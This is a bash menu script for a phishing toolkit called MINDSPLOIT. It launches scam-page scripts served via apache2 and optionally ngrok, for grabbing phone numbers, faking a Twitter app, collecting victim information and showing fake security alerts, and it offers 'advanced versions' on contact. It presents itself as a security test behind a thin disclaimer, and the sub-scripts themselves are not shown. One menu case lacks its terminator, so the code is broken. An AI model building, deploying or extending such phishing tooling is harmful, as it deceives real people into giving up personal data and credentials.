echo " "
bar ()
{
BAR='0 1 0 1 \e[00;31m 0 1 \e[00;43m 0 1 \e[00;34m !'    
                         
for i in {0..59}; do
    echo -ne "\r${BAR:0:$i}" 
    sleep 0.04
done
}
bar
echo " "
echo " "
echo -e "\e[00;44m______________________\e[00mMINDSPLOIT\e[00;44m______________________\e[00m"
echo " "

echo -e "\e[01;34m--------------------------------------\e[00m"
echo -e "Human Stupidity Phishing Test\e[00m"
echo -e "\e[00;38mTool created with phishing scenarios 
for test human security and stupidity\e[00m"
echo -e "\e[01;34m______________________________________\e[00m"
echo " "
echo -e "STATUS: \e[00;33mBeta 0.3\e[00m -- \e[00;31m Coded for security testing - The author decline any responsability for 
any illegal use of this tool\e[00m"
echo " "
bar
echo -e "\e[01;34mcoded by Cignoraptor\e[00m --- contact for advanced versions or suggestions > \e[00;34mroot4sec6per3@openmailbox.org\e[00m"
echo " "

echo " "
PS3="Choose an option:"

select opt in "DESCRIPTION" "PHONE NUMBER" "TWITTER APP" "COLLECT INFO" "SECURITY ALERT" "SEEK AND DESTROY"
do
    case "$opt" in
        'DESCRIPTION')
        echo " "
        echo -e "\e[00;36mThe scam-pages will be use apache2 server in auto mode"
echo -e "if you want work over internet (wan) you can port forwarding or use ngrok"
echo " "
echo -e "\e[00;31mWait! check if apache server is installed..."
sleep 0.5
command -v apache2 >/dev/null 2>&1 || { echo "apache2 it's not installed.  Aborting." >&2; exit 1; }
echo -e "\e[00;32mInstalled!"
echo " "
echo -e "\e[00;37mThe mission is understand and test some stupid scam and social engineering techniques"
echo -e "\e[01;34mCoded by Cignoraptor\e[00m"
echo " "     
        ;;
        'PHONE NUMBER')
        echo " "
        echo -e "\e[00;32mVery stupid test..."
        echo -e "\e[00;33mStarting..."
        sleep 1
        cd numberphish
        sudo bash numbergrab.sh
        cd - > /dev/null
        ;;
        'TWITTER APP')
        cd twitp
        sudo bash twapp.sh
        cd - > /dev/null
        ;;
        'COLLECT INFO')
        cd collect
        sudo bash colleziona.sh
        cd - >> /dev/null
        'SECURITY ALERT')
        cd sealert
        sudo bash avviascam.sh
        cd - > /dev/null
        ;;
        'SEEK AND DESTROY')
        cd evento
        sudo bash event.sh
        cd - >> /dev/null
        break;
        esac
        done
